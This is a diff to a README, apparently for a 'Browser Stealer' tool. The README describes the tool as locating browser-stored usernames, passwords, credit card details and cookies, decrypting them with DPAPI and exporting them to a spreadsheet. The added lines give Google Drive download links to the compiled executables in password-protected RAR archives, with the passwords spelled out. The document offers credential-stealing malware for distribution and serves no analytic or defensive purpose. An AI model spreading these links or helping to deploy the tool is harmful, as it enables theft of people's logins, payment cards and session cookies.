@@ -32,10 +32,23 @@ Finds Internet browsers and applications that use those browsers. It detects fil
 
 ![3](https://user-images.githubusercontent.com/71177413/166140991-14285215-a949-41fd-8a80-b7f15f762f57.JPG)
 
+<dl>
+  <dt> (Executable) Browser Stealer Download
+  <dd>
+  <dd> Browser_Stealer.rar --> zip password: "BrOWserSteaLEr2022"
+  <dd> Link = https://drive.google.com/file/d/1Q2XkhU64vHzKfyxmuPh-c9U3JdoqFeyS/view?usp=sharing
+</dl>
+
 
 **Browser Stealer Report:**
 Finds internet browsers and applications that use those browsers. It detects files containing personal information such as username and password, credit card information and cookies. It decrypts these files using DPAPI. It saves this information in an excel file named "Report.xls".
 
 ![8](https://user-images.githubusercontent.com/71177413/166141005-add888ec-49e3-45ef-b157-47055d9cb1d1.JPG)
 
+<dl>
+  <dt> (Executable) Browser Stealer Report
+  <dd>
+  <dd> Browser_Stealer_Report.rar --> zip password: "BroWSerSteaLErRePOrt2022"
+  <dd> Link = https://drive.google.com/file/d/13ZrjFqpua_BijbaE52RQ2gfCPX65Mubh/view?usp=sharing
+</dl>
 
